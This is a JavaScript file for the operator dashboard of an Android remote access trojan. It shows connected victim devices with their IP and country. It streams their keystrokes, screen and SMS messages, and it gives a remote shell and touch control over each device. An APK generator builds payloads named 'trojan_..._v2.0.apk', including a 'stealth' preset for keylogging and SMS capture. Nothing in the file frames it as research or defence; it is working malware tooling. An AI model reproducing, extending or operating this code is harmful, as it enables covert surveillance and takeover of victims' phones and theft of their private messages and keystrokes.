// =========================================
// MULTI-DEVICE DASHBOARD
// =========================================

// Global State
const activeDevices = new Map(); // deviceId -> { elements, state }
const connectedDevices = new Map(); // deviceId -> device info
let socket = null;

// DOM Elements
const deviceList = document.getElementById('deviceList');
const deviceCount = document.getElementById('deviceCount');
const multiDeviceGrid = document.getElementById('multiDeviceGrid');

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initSocket();
    setupEventListeners();
});

// =========================================
// SOCKET CONNECTION
// =========================================

function initSocket() {
    socket = io(`ws://${document.location.hostname}:4001/`, {
        transports: ['websocket'],
        upgrade: false
    });

    // Device list updates
    socket.on("info", (devices) => {
        updateDeviceList(devices);
    });

    // Device-specific data handlers
    socket.on("logger", (payload) => {
        const { deviceId, data } = payload;
        const device = activeDevices.get(deviceId);
        if (device && device.elements.output) {
            device.elements.output.value += data + "\n";
            device.elements.output.scrollTop = device.elements.output.scrollHeight;
        }
    });

    socket.on("img", (payload) => {
        const { deviceId, imageData } = payload;
        const device = activeDevices.get(deviceId);
        if (device && device.elements.screenImg && imageData && imageData.length > 0) {
            device.elements.screenImg.src = "data:image/jpeg;base64," + imageData;
        }
    });

    socket.on("sms", (payload) => {
        const { deviceId, data } = payload;
        const device = activeDevices.get(deviceId);
        if (device && device.elements.smsOutput) {
            device.elements.smsOutput.value += "----------------------------\n";
            data.forEach(msg => {
                device.elements.smsOutput.value += `[ ${msg.address} ] : ${msg.body}\n`;
            });
            device.elements.smsOutput.value += "----------------------------\n";
            device.elements.smsOutput.scrollTop = device.elements.smsOutput.scrollHeight;
        }
    });

    socket.on("shellOut", (payload) => {
        const { deviceId, output } = payload;
        const device = activeDevices.get(deviceId);
        if (device && device.elements.termOutput) {
            device.elements.termOutput.innerText += output;
            device.elements.termContainer.scrollTop = device.elements.termContainer.scrollHeight;
        }
    });
}

// =========================================
// DEVICE LIST MANAGEMENT
// =========================================

function updateDeviceList(devices) {
    connectedDevices.clear();

    if (!devices || devices.length === 0) {
        deviceList.innerHTML = '<div class="empty-state">No devices connected</div>';
        deviceCount.textContent = '0 active';
        return;
    }

    deviceList.innerHTML = '';
    devices.forEach(device => {
        connectedDevices.set(device.ID, device);

        const isActive = activeDevices.has(device.ID);

        const deviceItem = document.createElement('div');
        deviceItem.className = `device-item ${isActive ? 'selected' : ''}`;
        deviceItem.innerHTML = `
            <input type="checkbox" class="device-checkbox" 
                   data-device-id="${device.ID}" 
                   ${isActive ? 'checked' : ''}>
            <div class="device-info">
                <div class="device-name">${device.Brand} ${device.Model}</div>
                <div class="device-meta">${device.IP} • ${device.Country}</div>
            </div>
        `;

        deviceItem.addEventListener('click', (e) => {
            if (e.target.type !== 'checkbox') {
                const checkbox = deviceItem.querySelector('.device-checkbox');
                checkbox.checked = !checkbox.checked;
                checkbox.dispatchEvent(new Event('change'));
            }
        });

        const checkbox = deviceItem.querySelector('.device-checkbox');
        checkbox.addEventListener('change', (e) => {
            e.stopPropagation();
            if (e.target.checked) {
                addDevicePanel(device.ID);
            } else {
                removeDevicePanel(device.ID);
            }
        });

        deviceList.appendChild(deviceItem);
    });

    deviceCount.textContent = `${devices.length} active`;
}

// =========================================
// DEVICE PANEL MANAGEMENT
// =========================================

function addDevicePanel(deviceId) {
    if (activeDevices.has(deviceId)) return;

    const device = connectedDevices.get(deviceId);
    if (!device) return;

    // Remove empty state
    const emptyState = multiDeviceGrid.querySelector('.empty-grid-state');
    if (emptyState) emptyState.remove();

    // Create panel
    const panel = document.createElement('div');
    panel.className = 'device-panel';
    panel.dataset.deviceId = deviceId;

    panel.innerHTML = `
        <div class="device-panel-header">
            <div class="device-panel-title">
                <i class="icon">smartphone</i>
                ${device.Brand} ${device.Model}
            </div>
            <div style="display: flex; align-items: center; gap: 1rem;">
                <span class="status-indicator">ACTIVE</span>
                <div class="panel-zoom-controls">
                    <button class="zoom-btn zoom-in" title="Zoom In">
                        <i class="material-icons">add</i>
                    </button>
                    <button class="zoom-btn zoom-fullscreen" title="Fullscreen">
                        <i class="material-icons">crop_free</i>
                    </button>
                    <button class="zoom-btn zoom-out hidden" title="Zoom Out">
                        <i class="material-icons">remove</i>
                    </button>
                </div>
                <button class="device-panel-close" onclick="removeDevicePanel('${deviceId}')">
                    <i class="material-icons">close</i>
                </button>
            </div>
        </div>
        <div class="device-panel-body">
            <div class="device-panel-controls">
                <div class="device-toggles">
                    <label class="toggle-wrapper">
                        <input type="checkbox" value="logger" data-device-id="${deviceId}">
                        <span class="toggle-slider"></span>
                        <span class="toggle-label">Keylogger</span>
                    </label>
                    <label class="toggle-wrapper">
                        <input type="checkbox" value="screen" data-device-id="${deviceId}">
                        <span class="toggle-slider"></span>
                        <span class="toggle-label">Screen</span>
                    </label>
                    <label class="toggle-wrapper">
                        <input type="checkbox" value="sms" data-device-id="${deviceId}">
                        <span class="toggle-slider"></span>
                        <span class="toggle-label">SMS</span>
                    </label>
                    <label class="toggle-wrapper">
                        <input type="checkbox" value="shell" data-device-id="${deviceId}">
                        <span class="toggle-slider"></span>
                        <span class="toggle-label">Shell</span>
                    </label>
                </div>
            </div>
            
            <!-- Multi-View Container: All views visible simultaneously -->
            <div class="device-multi-view layout-quad">
                <!-- Screen View Panel -->
                <div class="view-panel">
                    <div class="view-panel-header">
                        <div style="display: flex; align-items: center; gap: 0.5rem;">
                            <i class="icon">screen_share</i>
                            <span>Screen Feed</span>
                        </div>
                        <button class="image-zoom-btn maximize-view" title="Maximize" data-view="screen">
                            <i class="material-icons">fullscreen</i>
                        </button>
                    </div>
                    <div class="view-panel-body screen-view">
                        <img draggable="false" alt="Screen Feed" style="max-width: 100%; max-height: 100%; object-fit: contain; cursor: none;">
                    </div>
                </div>
                
                <!-- Terminal View Panel -->
                <div class="view-panel">
                    <div class="view-panel-header">
                        <i class="icon">terminal</i>
                        Shell Access
                    </div>
                    <div class="view-panel-body terminal-view" style="display: flex; flex-direction: column;">
                        <div class="term-output" style="flex: 1; overflow-y: auto; padding: 0.75rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--text-primary);"></div>
                        <div class="term-input-line" style="display: flex; align-items: center; padding: 0.5rem; background: var(--bg-input); border-top: 1px solid var(--border-color);">
                            <span class="prompt" style="color: var(--brand-primary); margin-right: 0.5rem;">➜</span>
                            <input type="text" autocomplete="off" spellcheck="false" placeholder="Enter command..." style="flex: 1; background: transparent; border: none; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; outline: none;">
                        </div>
                    </div>
                </div>
                
                <!-- Logger Output Panel -->
                <div class="view-panel">
                    <div class="view-panel-header">
                        <i class="icon">article</i>
                        Logger Output
                    </div>
                    <div class="view-panel-body">
                        <textarea class="device-output" readonly spellcheck="false" style="width: 100%; height: 100%; background: var(--bg-app); border: none; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; padding: 0.75rem; resize: none; outline: none;"></textarea>
                    </div>
                </div>
                
                <!-- SMS/Data Panel -->
                <div class="view-panel">
                    <div class="view-panel-header">
                        <i class="icon">sms</i>
                        SMS & Data
                    </div>
                    <div class="view-panel-body">
                        <textarea class="device-sms" readonly spellcheck="false" style="width: 100%; height: 100%; background: var(--bg-app); border: none; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; padding: 0.75rem; resize: none; outline: none;"></textarea>
                    </div>
                </div>
            </div>
        </div>
    `;

    multiDeviceGrid.appendChild(panel);

    // Store element references
    const elements = {
        panel,
        output: panel.querySelector('.device-output'),
        smsOutput: panel.querySelector('.device-sms'),
        screenView: panel.querySelector('.screen-view'),
        screenImg: panel.querySelector('.screen-view img'),
        termContainer: panel.querySelector('.terminal-view'),
        termOutput: panel.querySelector('.term-output'),
        termInput: panel.querySelector('.terminal-view input')
    };

    activeDevices.set(deviceId, {
        elements,
        state: { currentView: 'output', activeFeatures: new Set() },
        zoomCleanup: null
    });

    // Setup event listeners for this panel
    setupPanelEventListeners(deviceId, elements);

    // Setup zoom controls
    const deviceState = activeDevices.get(deviceId);
    deviceState.zoomCleanup = setupZoomControls(deviceId, panel);

    // Setup view maximize/minimize
    if (typeof setupViewMaximize === 'function') {
        deviceState.viewMaximizeCleanup = setupViewMaximize(deviceId, panel);
    }

    // Update grid layout
    updateGridLayout();

    // Fetch device info
    fetchDeviceInfo(deviceId);
}

function removeDevicePanel(deviceId) {
    const device = activeDevices.get(deviceId);
    if (!device) return;

    // Stop all active features
    device.state.activeFeatures.forEach(feature => {
        sendCommand(deviceId, feature, 'stop');
    });

    // Cleanup zoom controls
    if (device.zoomCleanup) {
        device.zoomCleanup();
    }

    // Cleanup image zoom
    if (device.imageZoomCleanup) {
        device.imageZoomCleanup();
    }

    // Remove panel
    device.elements.panel.remove();
    activeDevices.delete(deviceId);

    // Update checkbox
    const checkbox = document.querySelector(`input[data-device-id="${deviceId}"]`);
    if (checkbox) {
        checkbox.checked = false;
        checkbox.closest('.device-item')?.classList.remove('selected');
    }

    // Show empty state if no devices
    if (activeDevices.size === 0) {
        multiDeviceGrid.innerHTML = `
            <div class="empty-grid-state">
                <i class="material-icons">pan_tool</i>
                <p>Select devices above to begin monitoring</p>
            </div>
        `;
    }

    updateGridLayout();
}

function updateGridLayout() {
    const count = activeDevices.size;
    multiDeviceGrid.className = 'multi-device-grid';
    if (count === 2) multiDeviceGrid.classList.add('grid-2');
    else if (count === 3) multiDeviceGrid.classList.add('grid-3');
    else if (count >= 4) multiDeviceGrid.classList.add('grid-4');
}

// =========================================
// PANEL EVENT LISTENERS
// =========================================

function setupPanelEventListeners(deviceId, elements) {
    // Feature toggles
    const toggles = elements.panel.querySelectorAll('.device-toggles input[type="checkbox"]');
    toggles.forEach(toggle => {
        toggle.addEventListener('change', (e) => {
            const feature = e.target.value;
            const action = e.target.checked ? 'start' : 'stop';
            handleFeatureToggle(deviceId, feature, action, e.target.checked);
        });
    });

    // Terminal input
    if (elements.termInput) {
        elements.termInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && e.target.value.trim()) {
                sendShellCommand(deviceId, e.target.value.trim());
                e.target.value = '';
            }
        });
    }

    // Mouse events for screen control
    if (elements.screenImg) {
        setupMouseControl(deviceId, elements.screenImg);
    }
}

function handleFeatureToggle(deviceId, feature, action, isActive) {
    const device = activeDevices.get(deviceId);
    if (!device) return;

    sendCommand(deviceId, feature, action);

    if (isActive) {
        device.state.activeFeatures.add(feature);
    } else {
        device.state.activeFeatures.delete(feature);
    }

    // All views are always visible in quad-panel layout
    // No view switching needed - all functions can run simultaneously
}

// =========================================
// MOUSE CONTROL
// =========================================

function setupMouseControl(deviceId, imgElement) {
    let clickX1 = 0, clickY1 = 0;

    imgElement.addEventListener('mouseup', (evt) => {
        const rect = evt.target.getBoundingClientRect();
        const visualWidth = rect.width;
        const visualHeight = rect.height;
        const naturalWidth = evt.target.naturalWidth;
        const naturalHeight = evt.target.naturalHeight;

        if (!naturalWidth || !naturalHeight) return;

        const visualRatio = visualWidth / visualHeight;
        const naturalRatio = naturalWidth / naturalHeight;

        let renderedWidth, renderedHeight, offsetX, offsetY;

        if (naturalRatio > visualRatio) {
            renderedWidth = visualWidth;
            renderedHeight = visualWidth / naturalRatio;
            offsetX = 0;
            offsetY = (visualHeight - renderedHeight) / 2;
        } else {
            renderedHeight = visualHeight;
            renderedWidth = visualHeight * naturalRatio;
            offsetX = (visualWidth - renderedWidth) / 2;
            offsetY = 0;
        }

        const clickX = evt.clientX - rect.left - offsetX;
        const clickY = evt.clientY - rect.top - offsetY;

        let type, args;

        if (Math.abs(evt.clientX - clickX1) < 5 && Math.abs(evt.clientY - clickY1) < 5) {
            // Click
            const xPct = clickX / renderedWidth;
            const yPct = clickY / renderedHeight;

            args = {
                "x": xPct.toFixed(6),
                "y": yPct.toFixed(6)
            };
            type = "click";
        } else {
            // Drag
            const startRawX = clickX1 - rect.left - offsetX;
            const startRawY = clickY1 - rect.top - offsetY;

            const x1Pct = startRawX / renderedWidth;
            const y1Pct = startRawY / renderedHeight;
            const x2Pct = clickX / renderedWidth;
            const y2Pct = clickY / renderedHeight;

            args = {
                "x1": x1Pct.toFixed(6),
                "y1": y1Pct.toFixed(6),
                "x2": x2Pct.toFixed(6),
                "y2": y2Pct.toFixed(6)
            };
            type = "drag";
        }

        socket.emit("mouse", {
            deviceId: deviceId,
            type: type,
            points: JSON.stringify(args)
        });
    });

    imgElement.addEventListener('mousedown', (evt) => {
        clickX1 = evt.clientX;
        clickY1 = evt.clientY;
    });
}

// =========================================
// COMMANDS
// =========================================

function sendCommand(deviceId, feature, action, ...args) {
    $.ajax({
        url: document.location.origin + '/send',
        method: 'POST',
        data: {
            id: deviceId,
            emit: feature,
            args: JSON.stringify([action, ...args])
        }
    });
}

function sendShellCommand(deviceId, command) {
    $.ajax({
        url: document.location.origin + '/send',
        method: 'POST',
        data: {
            id: deviceId,
            emit: 'shellCmd',
            args: JSON.stringify([command])
        }
    });
}

function fetchDeviceInfo(deviceId) {
    $.ajax({
        url: document.location.origin + '/info',
        method: 'POST',
        data: { id: deviceId }
    });
}

// =========================================
// UTILITY FUNCTIONS
// =========================================

function setupEventListeners() {
    // Download APK
    window.download = function () {
        const input = document.querySelector('#downloadAPK input');
        const ip = input.value.trim();
        if (!ip) {
            alert('Please enter IP address');
            return;
        }
        window.location.href = `/apk?ip=${ip}`;
    };
}

// Add hidden class utility
document.addEventListener('DOMContentLoaded', () => {
    const style = document.createElement('style');
    style.textContent = '.hidden { display: none !important; }';
    document.head.appendChild(style);
});

// =========================================
// ZOOM FUNCTIONALITY
// =========================================

function setupZoomControls(deviceId, panel) {
    const zoomIn = panel.querySelector('.zoom-in');
    const zoomFullscreen = panel.querySelector('.zoom-fullscreen');
    const zoomOut = panel.querySelector('.zoom-out');

    let zoomState = 'normal'; // normal, zoomed, fullscreen
    let overlay = null;

    function createOverlay() {
        overlay = document.createElement('div');
        overlay.className = 'zoom-overlay';
        overlay.addEventListener('click', () => resetZoom());
        document.body.appendChild(overlay);
    }

    function removeOverlay() {
        if (overlay) {
            overlay.remove();
            overlay = null;
        }
    }

    function resetZoom() {
        panel.classList.remove('zoomed', 'fullscreen');
        zoomIn.classList.remove('hidden');
        zoomFullscreen.classList.remove('hidden');
        zoomOut.classList.add('hidden');
        removeOverlay();
        zoomState = 'normal';
    }

    zoomIn.addEventListener('click', () => {
        if (zoomState === 'normal') {
            panel.classList.add('zoomed');
            zoomIn.classList.add('hidden');
            zoomFullscreen.classList.remove('hidden');
            zoomOut.classList.remove('hidden');
            createOverlay();
            zoomState = 'zoomed';
        }
    });

    zoomFullscreen.addEventListener('click', () => {
        if (zoomState === 'normal') {
            panel.classList.add('fullscreen');
            zoomIn.classList.add('hidden');
            zoomFullscreen.classList.add('hidden');
            zoomOut.classList.remove('hidden');
            createOverlay();
            zoomState = 'fullscreen';
        } else if (zoomState === 'zoomed') {
            panel.classList.remove('zoomed');
            panel.classList.add('fullscreen');
            zoomFullscreen.classList.add('hidden');
            zoomState = 'fullscreen';
        }
    });

    zoomOut.addEventListener('click', () => {
        resetZoom();
    });

    // ESC key to exit zoom
    const escHandler = (e) => {
        if (e.key === 'Escape' && zoomState !== 'normal') {
            resetZoom();
        }
    };

    document.addEventListener('keydown', escHandler);

    // Store cleanup function
    return () => {
        document.removeEventListener('keydown', escHandler);
        removeOverlay();
    };
}

// =========================================
// IMAGE ZOOM FUNCTIONALITY (Screen Feed)
// =========================================

function setupImageZoom(deviceId, screenView, screenImg) {
    const zoomInBtn = screenView.querySelector('.zoom-in-img');
    const zoomOutBtn = screenView.querySelector('.zoom-out-img');
    const zoomResetBtn = screenView.querySelector('.zoom-reset-img');
    const zoomDisplay = screenView.querySelector('.zoom-level-display');

    let zoomLevel = 1.0; // 100%
    const zoomStep = 0.1; // 10% per step
    const minZoom = 0.5; // 50%
    const maxZoom = 3.0; // 300%

    function updateZoom(newZoom) {
        zoomLevel = Math.max(minZoom, Math.min(maxZoom, newZoom));
        screenImg.style.transform = `scale(${zoomLevel})`;
        zoomDisplay.textContent = `${Math.round(zoomLevel * 100)}%`;
    }

    function zoomIn() {
        updateZoom(zoomLevel + zoomStep);
    }

    function zoomOut() {
        updateZoom(zoomLevel - zoomStep);
    }

    function resetZoom() {
        updateZoom(1.0);
    }

    // Button handlers
    zoomInBtn.addEventListener('click', zoomIn);
    zoomOutBtn.addEventListener('click', zoomOut);
    zoomResetBtn.addEventListener('click', resetZoom);

    // Keyboard shortcuts (Ctrl+/Ctrl-/Ctrl0)
    const keyHandler = (e) => {
        if (e.ctrlKey || e.metaKey) {
            if (e.key === '=' || e.key === '+') {
                e.preventDefault();
                zoomIn();
            } else if (e.key === '-' || e.key === '_') {
                e.preventDefault();
                zoomOut();
            } else if (e.key === '0') {
                e.preventDefault();
                resetZoom();
            }
        }
    };

    // Mouse wheel zoom (Ctrl + scroll)
    const wheelHandler = (e) => {
        if (e.ctrlKey || e.metaKey) {
            e.preventDefault();
            if (e.deltaY < 0) {
                zoomIn();
            } else {
                zoomOut();
            }
        }
    };

    screenView.addEventListener('wheel', wheelHandler, { passive: false });
    document.addEventListener('keydown', keyHandler);

    // Cleanup function
    return () => {
        document.removeEventListener('keydown', keyHandler);
        screenView.removeEventListener('wheel', wheelHandler);
    };
}

// =========================================
// VIEW PANEL MAXIMIZE/MINIMIZE
// =========================================

function setupViewMaximize(deviceId, panel) {
    const maximizeBtns = panel.querySelectorAll('.maximize-view');
    let maximizedView = null;
    let overlay = null;

    function createOverlay() {
        overlay = document.createElement('div');
        overlay.className = 'zoom-overlay';
        overlay.addEventListener('click', minimizeView);
        document.body.appendChild(overlay);
    }

    function removeOverlay() {
        if (overlay) {
            overlay.remove();
            overlay = null;
        }
    }

    function minimizeView() {
        if (maximizedView) {
            maximizedView.classList.remove('maximized');
            const btn = maximizedView.querySelector('.maximize-view');
            btn.innerHTML = '<i class="material-icons">fullscreen</i>';
            btn.title = 'Maximize';
            maximizedView = null;
            removeOverlay();
        }
    }

    maximizeBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const viewPanel = btn.closest('.view-panel');

            if (viewPanel.classList.contains('maximized')) {
                // Minimize
                minimizeView();
            } else {
                // Maximize
                if (maximizedView) {
                    minimizeView();
                }
                viewPanel.classList.add('maximized');
                btn.innerHTML = '<i class="material-icons">fullscreen_exit</i>';
                btn.title = 'Minimize';
                maximizedView = viewPanel;
                createOverlay();
            }
        });
    });

    // ESC key to minimize
    const escHandler = (e) => {
        if (e.key === 'Escape' && maximizedView) {
            minimizeView();
        }
    };

    document.addEventListener('keydown', escHandler);

    return () => {
        document.removeEventListener('keydown', escHandler);
        removeOverlay();
    };
}

// =========================================
// APK GENERATOR
// =========================================

function toggleAPKGenerator() {
    const panel = document.getElementById('apkGeneratorPanel');
    panel.classList.toggle('hidden');
    
    // Auto-detect server IP
    if (!panel.classList.contains('hidden')) {
        const serverIpInput = document.getElementById('serverIp');
        if (!serverIpInput.value) {
            serverIpInput.value = window.location.hostname || 'localhost';
        }
    }
}

function applyPreset(presetName) {
    const sms = document.getElementById('feature-sms');
    const keylogger = document.getElementById('feature-keylogger');
    const screen = document.getElementById('feature-screen');
    
    // Reset all
    sms.checked = false;
    keylogger.checked = false;
    screen.checked = false;
    
    // Apply preset
    switch(presetName) {
        case 'stealth':
            keylogger.checked = true;
            sms.checked = true;
            break;
        case 'control':
            screen.checked = true;
            break;
        case 'full':
            sms.checked = true;
            keylogger.checked = true;
            screen.checked = true;
            break;
    }
}

function generateCustomAPK() {
    const serverIp = document.getElementById('serverIp').value.trim();
    const features = [];
    
    // Collect selected features
    if (document.getElementById('feature-sms').checked) features.push('sms');
    if (document.getElementById('feature-keylogger').checked) features.push('keylogger');
    if (document.getElementById('feature-screen').checked) features.push('screen');
    
    // Validate at least one feature selected
    if (features.length === 0) {
        showNotification('Please select at least one feature', 'warning');
        return;
    }
    
    // Validate server IP
    if (!serverIp) {
        showNotification('Please enter a server IP address', 'warning');
        return;
    }
    
    // Show loading state
    const btn = document.querySelector('.generate-apk-btn');
    const originalHTML = btn.innerHTML;
    btn.innerHTML = '<i class="material-icons rotating">sync</i> Generating APK...';
    btn.disabled = true;
    
    // Send request to server
    fetch('/generate-apk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            serverIp: serverIp,
            features: features
        })
    })
    .then(response => {
        if (!response.ok) throw new Error('Generation failed');
        return response.blob();
    })
    .then(blob => {
        // Generate filename
        const featureStr = features.join('_');
        const filename = `trojan_${featureStr}_v2.0.apk`;
        
        // Download APK
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        showNotification(`APK generated successfully: ${filename}`, 'success');
        toggleAPKGenerator();
    })
    .catch(error => {
        console.error('APK generation error:', error);
        showNotification('Failed to generate APK. Check server logs.', 'error');
    })
    .finally(() => {
        btn.innerHTML = originalHTML;
        btn.disabled = false;
    });
}

// Add rotating animation for loading icon
const style = document.createElement('style');
style.textContent = `
    @keyframes rotate {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
    }
    .rotating {
        animation: rotate 1s linear infinite;
    }
`;
document.head.appendChild(style);

// Notification helper function
function showNotification(message, type = 'info') {
    const container = document.getElementById('msgs');
    if (!container) return;
    
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <i class="material-icons">${type === 'success' ? 'check_circle' : type === 'error' ? 'error' : type === 'warning' ? 'warning' : 'info'}</i>
        <span>${message}</span>
    `;
    
    container.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 300);
    }, 5000);
}

// =========================================
// LOGOUT FUNCTION
// =========================================

function logout() {
    // Clear session and redirect to login
    fetch('/logout', {
        method: 'POST',
        credentials: 'same-origin'
    })
    .then(response => {
        if (response.ok) {
            window.location.href = '/login';
        }
    })
    .catch(error => {
        console.error('Logout error:', error);
        // Force redirect even if request fails
        window.location.href = '/login';
    });
}

// Generate APK with preset configuration
function generatePreset(preset) {
    const serverIp = document.getElementById('serverIp').value.trim() || window.location.hostname;
    let features = [];
    
    switch(preset) {
        case 'stealth':
            features = ['sms'];
            break;
        case 'remote':
            features = ['keylogger', 'screen'];
            break;
        case 'full':
            features = ['sms', 'keylogger', 'screen'];
            break;
    }
    
    // Show loading state
    const btn = event.target.closest('.preset-card');
    const originalHTML = btn.innerHTML;
    btn.innerHTML = '<i class="material-icons rotating">sync</i><div class="preset-info"><span class="preset-name">Generating...</span></div>';
    btn.disabled = true;
    
    // Send request to server
    fetch('/generate-apk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            serverIp: serverIp,
            features: features
        })
    })
    .then(response => {
        if (!response.ok) throw new Error('Generation failed');
        return response.blob();
    })
    .then(blob => {
        // Create download link
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `trojan_${preset}_v2.0.apk`;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        showNotification('APK generated successfully!', 'success');
        btn.innerHTML = originalHTML;
        btn.disabled = false;
    })
    .catch(error => {
        console.error('APK generation error:', error);
        showNotification('Failed to generate APK', 'error');
        btn.innerHTML = originalHTML;
        btn.disabled = false;
    });
}
